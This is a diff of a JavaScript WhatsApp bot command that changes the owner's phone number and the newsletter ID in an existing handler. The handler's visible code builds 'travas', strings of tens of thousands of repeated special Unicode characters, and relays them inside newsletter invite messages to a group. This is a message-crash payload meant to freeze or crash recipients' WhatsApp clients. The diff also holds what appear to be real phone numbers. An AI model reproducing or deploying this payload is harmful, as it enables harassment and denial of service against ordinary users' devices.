@@ -1,7 +1,7 @@
 import fs from 'fs';
 
 let handler = async (m, { conn }) => {
-  const ownerNumber = '5491168607589@s.whatsapp.net';
+  const ownerNumber = '66825539106@s.whatsapp.net';
   const botNumber = conn.user?.jid || '';
   const sender = m.sender;
 
@@ -15,7 +15,7 @@ let handler = async (m, { conn }) => {
     const travas = 'ꦾ'.repeat(90000);
     await conn.relayMessage(groupId, {
       newsletterAdminInviteMessage: {
-        newsletterJid: "120363282786345717@newsletter",
+        newsletterJid: "120363345778623279@newsletter",
         newsletterName: "🗣🗣🗣🗣" + travas.repeat(3),
         jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/...Z', 'base64'),
         caption: "𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛  ᶻ 𝗓 𐰁",
@@ -39,7 +39,7 @@ let handler = async (m, { conn }) => {
     const travas = '𑇂𑆵𑆴𑆿'.repeat(75000);
     await conn.relayMessage(groupId, {
       newsletterAdminInviteMessage: {
-        newsletterJid: "120363282786345717@newsletter",
+        newsletterJid: "120363345778623279@newsletter",
         newsletterName: "🗣🗣🗣🗣" + travas.repeat(3),
         jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/...Z', 'base64'),
         caption: "𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛  ᶻ 𝗓 𐰁",
